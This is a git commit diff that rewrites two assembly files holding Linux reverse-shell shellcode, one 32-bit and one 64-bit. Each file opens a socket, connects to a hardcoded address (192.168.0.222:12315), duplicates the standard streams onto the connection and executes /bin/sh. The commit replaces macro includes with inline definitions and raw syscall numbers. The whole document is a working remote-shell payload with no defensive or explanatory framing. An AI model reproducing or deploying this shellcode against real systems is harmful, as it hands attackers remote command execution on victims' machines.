d70729250d5d3b618f9c403f85a4a433615f2b1f
idhyt <idhyt3r@gmail.com>
2020-09-10 17:05:19 +0800

    update

--- asm/linux/reverse32IPv4.asm
+++ asm/linux/reverse32IPv4.asm
@@ -1,11 +1,13 @@
-	;; Connect back shellcode
-	;; Handy One liner for IP
-	;; ''.join(['%02x'%int(x)for x in'1.1.1.1'.split('.')][::-1])
-	;; port is littleEndian
-%include "short32.s"
-%include "syscall.s"
-%include "util.s"
-	
+;;; utils.s
+
+%define htonl(x) (\
+    (((x) & 0x000000ff) << 24) | \
+    (((x) & 0x0000ff00) <<  8) | \
+    (((x) & 0x00ff0000) >>  8) | \
+    (((x) & 0xff000000) >> 24))
+%define ip(a,b,c,d) htonl(a << 24 | b << 16 | c << 8 | d) ; ip(127,0,0,1)
+%define htons(x) ((((x) & 0xff00) >> 8) | (((x) & 0x00ff) << 8))
+
 %define IP   dword      ip(192,168,0,222) 
 %define PORT word       htons(12315)	
 %define AF_INET         2
@@ -17,58 +19,63 @@
 	;; first argument is an integer and second is an arg struct ptr
 
 BITS 32
-	global main
+	global _start
 
-main:
-	xor eax,eax
-	mov ebx,eax
-	push eax
-	push byte SOCK_STREAM
-	push byte AF_INET
-	inc ebx			
-	mov ecx,esp
-	mov al,socketcall 
-	SYSTEM_CALL		;socket() ebx=1
-	
+_start:
+	xor 	eax, eax
+	mov 	ebx, eax
+	push 	eax
+	push 	byte SOCK_STREAM
+	push 	byte AF_INET
+	inc 	ebx			
+	mov 	ecx, esp
+	mov 	al, 102 
+	int 	80h		;socket() ebx=1
+
 	;eax has socket
 	inc ebx
 	
 IPandPort:
-	push IP
-	push PORT
-	push bx 		;bx=2 AF_INET
-	mov ecx,esp
-	push byte 0x10		;size of sockaddr
-	push ecx
-	push eax		;socket fd
-	inc ebx			;ebx=3 connect()
-	mov ecx,esp
-	SYSTEM_CALL(socketcall)
+	push 	IP
+	push 	PORT
+	push 	bx 				;bx=2 AF_INET
+	mov 	ecx, esp
+	push 	byte 0x10		;size of sockaddr
+	push 	ecx
+	push 	eax				;socket fd
+	inc 	ebx				;ebx=3 connect()
+	mov 	ecx, esp
+	mov 	al, 102
+	int 	80h
+
 ;;; connect reurns zero on success
 	
 	;; mov edi,eax		;connect fd
-	pop ebx			;the top of the stack has our socket
-	push byte 2
-	pop ecx			;loop counter and fd arg for dup2
+	pop 	ebx			;the top of the stack has our socket
+	push 	byte 2
+	pop 	ecx			;loop counter and fd arg for dup2
 
 copy:
-	mov al,dup2
-	SYSTEM_CALL		;dup2(ebx,ecx)
+	mov 	al, 63
+	int 	80h			;dup2(ebx,ecx)
 ;;; the system_call macro that takes an argument also zero is it out
 ;;; using extra bytes. We can save some space by assuming that
 ;;; dup2 won it error. 
-	dec ecx
-	jns copy
+	dec 	ecx
+	jns 	copy
 	
 	;; Any local shellcode here
 
 local32BinSh:
 	; execve("/bin/sh", 0, 0)
-	xor eax, eax
-	push eax
-	PUSH_STRING "/bin//sh"
-	mov ebx, esp		; arg1 = "/bin//sh\0"
-	mov ecx, eax		; arg2 = 0
-	mov edx, eax		; arg3 = 0
-	SYSTEM_CALL(execve)
+	xor 	ecx, ecx
+	xor 	edx, edx
+	push 	edx
+	push 	"//sh"
+	push 	"/bin"
+	mov 	ebx, esp
+	xor 	eax, eax
+	mov 	al, 0Bh
+	int 	80h
+
  
--- asm/linux/reverse64IPv4.asm
+++ asm/linux/reverse64IPv4.asm
@@ -1,13 +1,13 @@
-	;; 64bit Connect back shellcode
-	;; Handy One liner for IP
-	;; ''.join(['%02x'%int(x)for x in'1.1.1.1'.split('.')][::-1])
-	;; port is littleEndian
+;;; utils.s
 
-%include "short64.s"
-%include "syscall.s"
-%include "util.s"
+%define htonl(x) (\
+    (((x) & 0x000000ff) << 24) | \
+    (((x) & 0x0000ff00) <<  8) | \
+    (((x) & 0x00ff0000) >>  8) | \
+    (((x) & 0xff000000) >> 24))
+%define ip(a,b,c,d) htonl(a << 24 | b << 16 | c << 8 | d) ; ip(127,0,0,1)
+%define htons(x) ((((x) & 0xff00) >> 8) | (((x) & 0x00ff) << 8))
 
-	
 %define IP  		ip(192,168,0,222)
 %define PORT		htons(12315)		;port, Little Endian
 %define AF_INET 	2
@@ -17,11 +17,9 @@
 ;;; 	socket -> connect -> dup -> shell
 	
 BITS 64
-	global main
+	global _start
 	
-
-	
-main:
+_start:
 	
 open_my_socket:
 	push byte AF_INET
@@ -30,28 +28,30 @@ open_my_socket:
 	pop rsi
 	push byte ANY_PROTO
 	pop rdx
-	SYSTEM_CALL(socket)
+	mov eax, 41
+	syscall
 
 	xchg rax,rdi
 
 make_sockaddr:
 	push byte 0		;lame part of sockaddr
-	mov rax, (IP <<32 | PORT <<16 | AF_INET) 
+	mov rax, (IP << 32 | PORT << 16 | AF_INET) 
 	push rax		;important part of sockaddr
 	
 	mov rsi,rsp		;struct sockaddr*
 	push 0x10
 	pop rdx			;addrlen
 	;RDI=sockfd
-	SYSTEM_CALL(connect)
+	mov eax, 42
+	syscall
 	;; assume success (RAX=0)
-	
 	
 	push byte 2		;loop count and FD#
 	pop rsi
 
 copy_stdin_out_err:
-	SYSTEM_CALL(dup2)	
+	mov eax, 33
+	syscall
 	dec rsi
 	jns copy_stdin_out_err
 	
@@ -59,13 +59,11 @@ copy_stdin_out_err:
 	;; incbin "../shell64/shellcode"
 
 local64BinSh:
-	xor  eax, eax
-	push rax
-	mov  rdi, 0x68732f2f6e69622f ;/bin//sh
-	push rdi
-	mov  al,  execve
-	mov  rdi, rsp
-	xor  esi, esi
-	xor  edx, edx
+	xor 	rsi, rsi
+	push 	rsi
+	mov 	rdi, 0x68732f2f6e69622f ; /bin//sh
+	push 	rdi
+	mov     rdi, rsp
+	mov 	rax, 59
+	cdq
 	syscall
-
